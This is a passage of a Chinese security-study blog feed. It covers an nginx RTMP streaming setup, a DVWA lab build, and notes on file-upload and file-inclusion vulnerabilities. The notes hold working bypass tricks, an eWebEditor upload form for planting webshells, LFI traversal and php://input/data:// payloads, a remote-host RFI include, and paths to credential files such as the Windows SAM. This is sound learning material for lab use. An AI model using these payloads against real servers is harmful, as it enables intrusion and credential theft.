<pre class="highlight"><span class="line">location /live &#123;</span><br><span class="line"></span><br><span class="line">  flv_live on;</span><br><span class="line"></span><br><span class="line">  chunked_transfer_encoding on;</span><br><span class="line"></span><br><span class="line">  add_header Access-Control-Allow-Origin *;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>

<p>在文件末尾新增（与http函数同级）</p>
<pre class="highlight"><span class="line">rtmp &#123;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line"></span><br><span class="line">		listen 1935;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">		application chen &#123;</span><br><span class="line"></span><br><span class="line">			live on;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>

<p>（注！live不可更改，会导致无法加载视频）</p>
<h2 id="4、检查"><a href="#4、检查" class="headerlink" title="4、检查"></a>4、检查</h2><pre class="highlight"><span class="line">nginx -t		# 检测配置文件有无语法错误</span><br><span class="line">nginx -s reload	# 重新加载</span><br></pre>

<h2 id="5、推流设置"><a href="#5、推流设置" class="headerlink" title="5、推流设置"></a>5、推流设置</h2><p>OBS推流设置（PC）</p>
<table>
<thead>
<tr>
<th align="left">说明</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td align="left">服务器</td>
<td align="left">rtmp://139.224.x.x/live/</td>
</tr>
<tr>
<td align="left">串流密钥</td>
<td align="left">chen（可更改，类似于密码）</td>
</tr>
</tbody></table>
<p>杏林推流设置（APP）</p>
<pre class="highlight"><span class="line">rtmp://139.224.x.x/live/chen</span><br></pre>

<h2 id="6、观看"><a href="#6、观看" class="headerlink" title="6、观看"></a>6、观看</h2><pre class="highlight"><span class="line">http://bilibili.github.io/flv.js/demo/			#观看视频地址</span><br><span class="line">http://139.224.x.x/live?app=live&amp;stream=chen	#推流视频链接</span><br></pre>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>直播推流</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建综合靶场</title>
    <url>/article/%E6%90%AD%E5%BB%BA%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>渗透学习中经常会用到到靶场，这里综合了几个常用的靶场，分享一下。</p>
<h1 id="二、搭建"><a href="#二、搭建" class="headerlink" title="二、搭建"></a>二、搭建</h1><p>搭建在centos中，主要是对DVWA做配置</p>
<h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>

<p>启动apache并设置开机自启</p>
<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>

<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>

<p>启动Mysql并设置开机自启</p>
<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>

<p>配置Mysql数据库</p>
<p>初始化mysql数据库（全部回车确认）</p>
<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>

<p>设置mysql密码（非操作系统密码）</p>
<p>配置</p>
<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>

<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>

<p>重启apache使php生效（php不是独立软件，依附apache）</p>
<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>

<p>配置</p>
<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>

<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>

<p>解压并复制到/var/www/html目录</p>
<p>配置</p>
<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改用户密码为数据库用户密码（root:xxx）</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br><span class="line"></span><br><span class="line">vim /etc/php.ini		# 修改apache配置文件（文件上传会用到）</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br></pre>

<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http://虚拟机IP</span><br></pre>

<p>sql-lab和dvwa都需要初始化</p>
<p>DVWA密码 admin:password</p>
<h1 id="四、下载"><a href="#四、下载" class="headerlink" title="四、下载"></a>四、下载</h1><p><a href="https://www.zerochen.top/download/Env/a.gz.tar">https://www.zerochen.top/download/Env/a.gz.tar</a></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>综合靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/article/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="一、漏洞原理"><a href="#一、漏洞原理" class="headerlink" title="一、漏洞原理"></a>一、漏洞原理</h1><p>1、未过滤或web前端过滤被绕过</p>
<p>2、文件检测被绕过</p>
<p>3、中间件解析</p>
<p>4、不完善的黑名单拓展名</p>
<p>5、文件路径截断</p>
<p>6、HTTP不安全方法（PUT协议）</p>
<h1 id="二、漏洞触发点"><a href="#二、漏洞触发点" class="headerlink" title="二、漏洞触发点"></a>二、漏洞触发点</h1><table>
<thead>
<tr>
<th align="left">说明</th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">存在漏洞的网站类型</td>
<td align="left">存在文件上传功能的网站皆有可能出现文件上传漏洞</td>
</tr>
<tr>
<td align="left">常见存在漏洞的位置</td>
<td align="left">头像、相册上传 ；视频、照片分享 ；论坛发帖、留言、邮箱附件上传 ；添加文章图片 ；编辑器文件上传 ；后台添加模板等</td>
</tr>
</tbody></table>
<h1 id="三、利用条件"><a href="#三、利用条件" class="headerlink" title="三、利用条件"></a>三、利用条件</h1><p>1、服务器开启文件上传功能</p>
<p>2、用户对目录拥有读写权限、执行权限</p>
<p>3、web容器可以以指定格式解析上传的文件（如php站点以php方式解析任意含马文件）</p>
<p>4、服务器配置不当（开启PUT方法）</p>
<p><strong>使用前提</strong></p>
<p>1、文件名后缀必须符合当前网站的开发语言类型</p>
<p>2、确保内容正确，有且只有一个语法标签，如</p>
<p>3、知道文件路径</p>
<p><strong>文件上传漏洞分类</strong></p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">任意文件上传</td>
<td align="left">无限制</td>
</tr>
<tr>
<td align="left">前端限制</td>
<td align="left">js、标签等</td>
</tr>
<tr>
<td align="left">后端限制</td>
<td align="left">文件名后缀 MIME-type类型 文件内容</td>
</tr>
<tr>
<td align="left">解析漏洞</td>
<td align="left">iis、nginx、apache、tomcat</td>
</tr>
<tr>
<td align="left">其他类型</td>
<td align="left">00截断、put截断、修改模板等</td>
</tr>
</tbody></table>
<p><strong>判断操作系统类型</strong></p>
<p>选择图片路径，改大小写，访问成功为windows、失败为linux</p>
<h1 id="四、绕过方式"><a href="#四、绕过方式" class="headerlink" title="四、绕过方式"></a>四、<strong>绕过方式</strong></h1><table>
<thead>
<tr>
<th align="left">waf类型</th>
<th align="left">说明</th>
<th align="left">方法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">前端验 证</td>
<td align="left">上传.xxx文件，抓包，若未抓包边被拦截，即为前段验证。</td>
<td align="left">1、禁用js（不推荐） <br>2、bp抓包改文件名后缀</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">后端验证</td>
<td align="left">分别修改文件名后缀、文件类型和文件内容，观察哪一次修改被拦截，即为哪种验证</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">文件类型检测</td>
<td align="left">MIME，描述消息内容类型的因特网标准 <br>Content-Type： <br>.js -&gt; application/x-javascript <br>.html -&gt; text/html <br>.jpg -&gt; image/jpeg * <br>.png -&gt; image/png <br>.pdf -&gt; application/pdf</td>
<td align="left">常用类型：image/jpeg</td>
</tr>
<tr>
<td align="left">后缀名检测</td>
<td align="left">黑白名单 上传.xxx文件，通过即为黑名单，不通过为白名单 常见黑名单后缀 php：”.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”, jsp：”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”, asp：”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,,”.cEr”,”.sWf”,”.swf”</td>
<td align="left">黑名单绕过 <br>1、大小写绕过 linux中，centos6搭载默认apache2.2时可绕过 windows可以绕过 <br> 2、黑名单不全绕过 php：.php3、.phtml asp：.cer、.asmx  <br><br>3、windows系统特性绕过 a.php. <br>a.php (空格) <br>a.php:1 <br>a.php::$DATA</td>
</tr>
<tr>
<td align="left">内容检测</td>
<td align="left">会检测图片流数据前n位，判断文件类型、大小等。</td>
<td align="left">制作图片马。<br>最好选择不含PHP、ASP、ASP等标签的图片 如果有，需要手动剔除 <br><br>copy 1.jpg /b + 2.txt /a 3.jpg <br>将2中内容追加到1中，生成3 2中可同时写入多种一句话</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">解析漏洞</td>
<td align="left">1、Apache解析漏洞 <br>&gt;多后缀 apache解析顺序从右到左，若是无法解析，则返回源码。 <br>前提：<br>apache1.x、2.x<br>Apache能够识别的文件在mime.types文件可以查看 <br>形式： <br>a.php.xxx.yyy绕过（黑名单绕过） <br>a.php.7z（可绕过白名单–不在apache解析目录，但是在白名单目录） <br><br>&gt;配置错误 apache配置文件可指定解析后缀类型 <br>&gt;.htaccess apache环境下，当上传文件未拦截.htaccess且未重命名文件时，可上传.htaccess修改apache默认配置  <br><br>2、IIS6.0解析漏洞 <br>&gt;目录解析 <br>形式：<br>/xx.asp/xx.jpg <br>原理：<br>在网站下创建文件夹名字为.asp、.asa的文件夹，其目录内的任何扩展名的文件都被当作asp文件来解析并执行。 <br><br>&gt;文件解析 <br>形式：<br>/xx.asp;.jpg（利用特殊符号”;”）<br>原理：<br>在iis6.0下，服务器默认不解析；号后面的内容，所以xx.asp;.jpg被解析为asp脚本解析漏洞 <br><br>&gt;解析文件类型（属于黑名单绕过方式） <br>形式：<br>/test.asa、/test.cer、/test.cdx <br>原理：<br>iis6.0默认的可执行文件除了asp还包含这三种asa、cer、cdx，会将这三种扩展名文件解析为asp文件  <br><br>3、PHP CGI解析漏洞 <br>IIS7.0/IIS7.5/Nginx&lt;0.8.3畸形解析漏洞 <br>前提： <br>1、Fast-CGI运行模式 <br>2、php.ini里cgi.fix_pathinfo=1(默认为1) <br>3、取消勾选php-cgi.exe程序的”Invoke handler only if request is mapped to” <br>形式：将/xx.jpg/xx.php解析为php文件 <br>4、Nginx解析漏洞 <br>影响版本：<br>0.5，0.6，0.7&lt;=0.7.65，0.8&lt;=0.8.37 <br>原理：<br>在使用PHP-FastCGI执行php的时候，URL里面在遇到%00空字节时与FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码 <br>形式：<br>xxx.jpg%00.php</td>
<td align="left">&gt;配置错误 <br>AddHandler php5-script .php、<br>AddType application/x-httpd-php .jpg <br><br>&gt;.htaccess <br>AddType application/x-httpd-php xxx 使用php解析.xxx文件 <br><br>或 <br>&lt;FilesMatch .ccc$&gt; SetHandler application/x-httpd-php <br>正则匹配.ccc后缀文件 <br><br>或 <br>&lt;FilesMatch “shell.jpg”&gt; SetHandler application/x-httpd-php <br>指定解析某个文件</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">其他类型</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">.user.ini</td>
<td align="left">自动文件包含，可将jpg解析为php文件，包含于php文件首部，只适用于PHP，7.3版本可用，类似于Apache配置文件.htaccess<br>注意：文件夹下必须有php文件才可生效</td>
<td align="left">auto_prepend_file=x.jpg <br>注意，文件名必须相同，访问任意php文件即可生效</td>
</tr>
<tr>
<td align="left">00截断</td>
<td align="left">前提： <br>1、php版本小于5.3.4 <br>2、php的magic_quotes_gpc为OFF状态</td>
<td align="left">抓包 POST包： <br>1.php+.jpg，将+的数值改为十六进制的00 <br>GET包： <br>1.php%00，存在上传路径时，也可在上传路径后用此方法截断</td>
</tr>
<tr>
<td align="left">HTTP PUT方法</td>
<td align="left">前提：<br>开启PUT服务 <br>探测： <br>telnet 192.168.139.136 80 <br>OPTIONS / HTTP/1.1 <br>HOST:172.16.132.161 <br>利用： <br>telnet 192.168.139.136 80 <br>PUT /infoa.php HTTP/1.1 <br>HOST: 192.168.139.136 <br>Content-Length: 18</td>
<td align="left">开启PUT服务： <br>1、开启Dav（conf配置文件）–取消注释<br> LoadModule dav_module modules/mod_dav.so LoadModule dav_fs_module modules/mod_dav_fs.so <br><br>2、启用Dav DocumentRoot-Directory下新增DAV On <br><br>3、开启文件锁 配置文件首部新增 DavLockDB <br>c:\phpstudy\www\DavLock 新增DavLock文件夹（上面写的路径） 重启apache服务</td>
</tr>
</tbody></table>
<h1 id="五、编辑器漏洞"><a href="#五、编辑器漏洞" class="headerlink" title="五、编辑器漏洞"></a>五、编辑器漏洞</h1><p>常见文本编辑器</p>
<p>FCKeditor、Ewebeditor、Ueditor、KindEditor、XHeditor</p>
<h2 id="1、FCKeditor漏洞"><a href="#1、FCKeditor漏洞" class="headerlink" title="1、FCKeditor漏洞"></a>1、FCKeditor漏洞</h2><p><strong>漏洞版本</strong></p>
<table>
<thead>
<tr>
<th align="left">版本</th>
<th align="left">漏洞说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Version2.2版本</td>
<td align="left">Apache+linux环境下在上传文件后面加个.突破</td>
</tr>
<tr>
<td align="left">Version&lt;=2.4.2</td>
<td align="left">forphp上传的地方并未对Media类型进行上传文件类型的控制，导致用户上传任意文件</td>
</tr>
<tr>
<td align="left">Version&lt;=v2.4.3</td>
<td align="left">FCKeditor被动限制策略所导致的过滤不严问题较高版本FCKeditor文件上传“.”变“_”下划线</td>
</tr>
</tbody></table>
<p><strong>方法</strong></p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">查看编辑器</td>
<td align="left">/fckeditor/editor/dialog/fck_about.html /fckeditor/_whatsnew.html</td>
</tr>
<tr>
<td align="left">FCKeditor中test文件的上传地址</td>
<td align="left">fckeditor/editor/filemanager/connectors/test.html fckeditor/editor/filemanager/connectors/uploadtest.html fckeditor/editor/filemanager/browser/default/connectors/test.html fckeditor/editor/filemanager/upload/test.html</td>
</tr>
<tr>
<td align="left">&gt;2.4.3版本绕过</td>
<td align="left">在fckeditor/editor/filemanager/connectors/test.html下 同时创建两个x.asp文件夹，一级目录可绕过.转义成_，从而在一级目录a.asp下上传图片马，进行解析</td>
</tr>
</tbody></table>
<h2 id="2、Ewebeditor编辑器漏洞"><a href="#2、Ewebeditor编辑器漏洞" class="headerlink" title="2、Ewebeditor编辑器漏洞"></a>2、Ewebeditor编辑器漏洞</h2><p>Ewebeidtor编辑器的默认信息</p>
<table>
<thead>
<tr>
<th align="left">说明</th>
<th align="left">路径</th>
</tr>
</thead>
<tbody><tr>
<td align="left">默认数据库路径：</td>
<td align="left">/db/ewebeditor.mdb /db/db.mdb <br>/db/%23ewebeditor.mdb</td>
</tr>
<tr>
<td align="left">默认密码：</td>
<td align="left">admin/admin/888或admin/admin进入后台，也可尝试admin/123456/admin888</td>
</tr>
<tr>
<td align="left">系统默认：</td>
<td align="left">ewebeditor.asp?id=content1&amp;style=standards</td>
</tr>
<tr>
<td align="left">默认管理地址：</td>
<td align="left">2.80以前：<br>ewebeditor/admin_login.asp；<br>以后版本：<br>admin/login.aspEwebeditor</td>
</tr>
</tbody></table>
<p><strong>漏洞类型</strong></p>
<table>
<thead>
<tr>
<th align="left">说明</th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">1.关键文字的名称和路径</td>
<td align="left">登录页面<br>Admin_Login.asp <br>Admin_Default.asp <br><br>管理首页<br>Admin_UploadFile.asp <br>Upload.asp</td>
</tr>
<tr>
<td align="left">2.默认用户名密码</td>
<td align="left">账号密码基本是默认的admin/admin（admin888）</td>
</tr>
<tr>
<td align="left">3.下载数据库</td>
<td align="left">默认数据库/db/ewebeditor.mdb或者/db/ewebeditor.asp</td>
</tr>
<tr>
<td align="left">4.文件上传</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">5.遍历路径</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">6.Cookie漏洞</td>
<td align="left"></td>
</tr>
</tbody></table>
<p><strong>利用</strong></p>
<p>1、登录后台，进入样式管理，增加上传类型即可。</p>
<p>2、访问<code>/admin/ewebEditor/asp/upload.asp?action=save&amp;type=image&amp;style=popup&amp;cusdir=hack.asp</code></p>
<p>创建hack.asp文件夹，此文件夹下文件全部可执行</p>
<p>检查元素，编辑html</p>
<pre class="highlight"><span class="line">&lt;form action=&quot;http://192.168.1.1/admin/ewebEditor/asp/upload.asp?		action=save&amp;type=image&amp;style=popup&amp;cusdir=hack.asp&quot; method=post name=myform enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=file name=uploadfile size=100&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=submit value=upload&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre>

<p>新增上传窗口，上传图片马，查看源码即可获得文件路径。</p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/article/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为文件包含。但是如果未对动态调用的变量做出限制（如同SQL注入漏洞一样，未对客户端输入进行过滤，从而造成违背开发人员本意的语句执行–这里是指调用了恶意文件），客户端可以调用任意文件，则造成了文件包含漏洞。</p>
<p>大多数Web语言都可以使用文件包含操作，其中PHP语言所提供的文件包含功能太强大、太灵活。所以包含漏经常出现在PHP语言中，在JSP/ASP/ASP.net程序中比较少。</p>
<h1 id="二、文件包含函数"><a href="#二、文件包含函数" class="headerlink" title="二、文件包含函数"></a>二、文件包含函数</h1><p><strong>常见函数</strong></p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">include()</td>
<td align="left">找不到被包含的文件时只产生警告，脚本将继续执行</td>
</tr>
<tr>
<td align="left">include_once()</td>
<td align="left">此语句和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</td>
</tr>
<tr>
<td align="left">require()</td>
<td align="left">找不到被包含的文件时会产生致命错误，并停止脚本</td>
</tr>
<tr>
<td align="left">require_once()</td>
<td align="left">此语句和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</td>
</tr>
</tbody></table>
<p>require()和include()函数的区别：</p>
<p>使用require()函数包含文件时，只要程序执行，立即调用文件，而include()只有程序执行到该函数时才调用。</p>
<p><strong>其它函数：</strong></p>
<p>highlight_file()、show_source()、readfile()、file_get_contents()、fopen()、file()等</p>
<h1 id="三、文件包含分类"><a href="#三、文件包含分类" class="headerlink" title="三、文件包含分类"></a>三、文件包含分类</h1><h2 id="1、本地文件包含–LFI"><a href="#1、本地文件包含–LFI" class="headerlink" title="1、本地文件包含–LFI"></a>1、本地文件包含–LFI</h2><p>可以读取和打开本地文件</p>
<p><strong>前提：</strong></p>
<p>1、allow_url_fopen=On（php.ini中进行配置，该选项默认为On）</p>
<p>2、用户可以动态控制变量</p>
<p><strong>利用：</strong></p>
<p>1、获取到系统中的其他文件的内容</p>
<p>绝对路径：<code>?action=C:\\Windows\\System32\\drivers\\etc\\hosts</code></p>
<p>相对路径：<code>?action=..\..\..\windows\\system32\\drivers\\etc\\hosts</code></p>
<p><strong>包含图片马</strong>：</p>
<p>/action.php?action=test.jpg</p>
<p><strong>包含日志文件：</strong></p>
<p>文件路径</p>
<pre class="highlight"><span class="line">访问日志：</span><br><span class="line">	access_log（在Windows上是access.log）	</span><br><span class="line">错误日志：</span><br><span class="line">	error_log（在Windows上是error.log）</span><br><span class="line">	</span><br><span class="line">默认安装路径：</span><br><span class="line">	CentOS、Redhat、Fedora:/var/log/httpd/</span><br><span class="line">	Ubuntu、Debian、Kali:/var/log/apache2/</span><br><span class="line">源码安装路径：</span><br><span class="line">	/usr/local/apache2/logs/</span><br><span class="line">	</span><br><span class="line">具体可通过配置文件查看与更改</span><br><span class="line">	/etc/httpd/conf/httpd.conf</span><br></pre>

<p>注意：</p>
<p>1、使用日志文件包保证文件内有且只有一对脚本语言的标签，可以在零点时使用。</p>
<p>2、使用bp抓包写入，防止出现编码问题。</p>
<p><strong>包含session：</strong></p>
<p>文件路径</p>
<pre class="highlight"><span class="line">默认：</span><br><span class="line">/var/lib/php/session、/var/lib/php5/session等</span><br><span class="line">可以通过phpinfo查看，session.save_path（受版本影响）</span><br></pre>

<p>session名构成：</p>
<p>sess_[phpsessid]，phpsessid 在客户端存储信息cookie中可看到。</p>
<p>通过代码审计或传入、包含构造的session文件进行利用</p>
<pre class="highlight"><span class="line">利用代码（类似的源码或者自己构造）</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$shell=$_GET[&#x27;shell&#x27;];</span><br><span class="line">$_SESSION[&quot;username&quot;]=$shell;</span><br><span class="line">?&gt;</span><br></pre>

<p><strong>利用</strong></p>
<pre class="highlight"><span class="line">/shell.php?cmd=&lt;?php phpinfo();?&gt;		#写入一句话</span><br><span class="line">xx.php?file=/var/lib/php5/session/sess_xxxxxxx		#文件包含利用</span><br></pre>

<p><strong>绕过</strong></p>
<p>代码环境</p>
<pre class="highlight"><span class="line">#  增加指定后缀  </span><br><span class="line">&lt;?php  $filename=$_GET[&#x27;filename&#x27;];  include($filename.&quot;php&quot;);  ?&gt;  </span><br></pre>

<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%00截断</td>
<td align="left">前提： <br>1、magic_quotes_gpc=Off <br>2、php版本&lt;5.3.4 <br><br>用法： <br>?action=phpinfo.php%00</td>
</tr>
<tr>
<td align="left">路径长度截断</td>
<td align="left">前提： <br>1、Windows下要长于256字节，超出的部分会被丢弃 <br>2、Linux下要长于4096字节，超出的部分会被丢弃。 <br><br>用法： <br>?action=phpinfo.php../../../../…</td>
</tr>
<tr>
<td align="left">点号截断</td>
<td align="left">前提： <br>windows系统，点号需要长于256 <br>用法： <br>?action=phpinfo.php……….</td>
</tr>
<tr>
<td align="left">其他</td>
<td align="left">增加前缀： <br>相对路径、绝对路径绕过  <br><br>增加后缀 ： <br>伪协议绕过  <br>过滤../：使用…/.绕过，过滤一次还剩下../ …</td>
</tr>
</tbody></table>
<h2 id="2、远程文件包含–RFI"><a href="#2、远程文件包含–RFI" class="headerlink" title="2、远程文件包含–RFI"></a>2、远程文件包含–RFI</h2><p>能够包含远程服务器上的文件并执行，可以通过http(s)或者ftp等方式，远程加载文件</p>
<p><strong>前提：</strong></p>
<p>1、allow_url_include=On（默认为OFF，需要在php.ini中手动打开）</p>
<p>2、allow_url_fopen=On（是否允许打开远程文件）</p>
<p>3、用户可以动态控制变量</p>
<p><strong>利用——伪协议</strong></p>
<table>
<thead>
<tr>
<th align="left">协议</th>
<th align="left">利用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">file://</td>
<td align="left">访问本地文件系统 <br>使用条件： <br>allow_url_fopen：off/on <br>allow_url_include：off/on <br><br>file: //协议在两个配置都为off的情况下是可以正常使用的  <br>使用方法： <br>file: //文件的绝对路径和文件名 [?path=file://c:\windows\System32\drivers\etc\hosts]</td>
</tr>
<tr>
<td align="left">php://</td>
<td align="left">访问各个输入/输出流 <br>php://filter <br><br>使用条件： <br>allow_url_fopen：off/on <br>allow_url_include：off/on <br>两个配置都为off的情况下是可以正常使用的  <br><br>使用： <br>[?path=php://filter/read=convert.base64-encode/resource=文件.php] <br><br>注意：<br>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell，但能读取敏感文件。  <br><br>php://filter协议与file://协议的区别：<br>file协议只能使用绝对路径，filter协议相对路径和绝对路径都可以使用PHP伪协议  <br><br>php://input <br>用途： 可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行 <br>使用条件： <br>allow_url_fopen：off/on <br>allow_url_include：on <br>使用方法： <br>?file=php://input[POST]： (执行POST DATA中的内容)</td>
</tr>
<tr>
<td align="left">zip://</td>
<td align="left">用途： <br>读取zip压缩包内容 <br>使用条件： <br>allow_url_fopen = off/on <br>allow_rul_include=off/on <br><br>使用方法： <br>?file=zip://D:/soft/phpstudy/www/file.zip%23phpcode.txt <br>若是zip后缀被禁用，可直接改zip后缀为jpg后缀，继续使用zip协议访问</td>
</tr>
<tr>
<td align="left">phar://</td>
<td align="left">压缩协议，使用同zip协议 <br>?file=phar://D:/soft/phpstudy/www/file.jpg%23phpcode.txt</td>
</tr>
<tr>
<td align="left">data://</td>
<td align="left">?file=data://text/plain, <br>或 <br>?file=data://text/plain;base64,base64编码数据</td>
</tr>
<tr>
<td align="left">http://</td>
<td align="left">访问HTTP(S)网址 <br>?path=<a href="http://ip/info.php">http://ip/info.php</a></td>
</tr>
<tr>
<td align="left">ftp://</td>
<td align="left">访问FTP(S) URLS <br>?path=ftp://用户名:密码@ip/info.php</td>
</tr>
</tbody></table>
<p><strong>绕过</strong></p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">问号绕过</td>
<td align="left">?在url中是用来连接第一个变量的（多个变量使用&amp;连接） <br>?action=<a href="http://192.168.152.143/phpinfo.php">http://192.168.152.143/phpinfo.php</a>?</td>
</tr>
<tr>
<td align="left">#号绕过</td>
<td align="left">#在url中是定位符，跳转至指定文件的#标记（相当于搜索），需要url编码 <br>?action=<a href="http://192.168.152.143/phpinfo.php%23">http://192.168.152.143/phpinfo.php%23</a></td>
</tr>
<tr>
<td align="left">空格绕过</td>
<td align="left">windows特性 <br>?action=<a href="http://192.168.152.143/phpinfo.php">http://192.168.152.143/phpinfo.php%20</a></td>
</tr>
<tr>
<td align="left">python自定义响应包绕过</td>
<td align="left">在服务器端使用python开启http服务，定制响应体，可绕过远程文件包含限制 <br>python -m http.server 8000 python RFIServer.py <br>下载地址：<br> <a href="https://www.zerochen.top/download/RFI/RFIServer.py">https://www.zerochen.top/download/RFI/RFIServer.py</a></td>
</tr>
</tbody></table>
<h1 id="四、常见的敏感信息路径"><a href="#四、常见的敏感信息路径" class="headerlink" title="四、常见的敏感信息路径"></a>四、常见的敏感信息路径</h1><p><strong>Windows系统</strong></p>
<pre class="highlight"><span class="line">c:\boot.ini 									# 查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 		# IIS配置文件</span><br><span class="line">C:\windows\system32\config\sam 					# 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini 					# MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD 		# MySQL root密码</span><br><span class="line">c:\windows\php.ini 								# php 配置信息</span><br></pre>

<p><strong>Linux/Unix系统</strong></p>
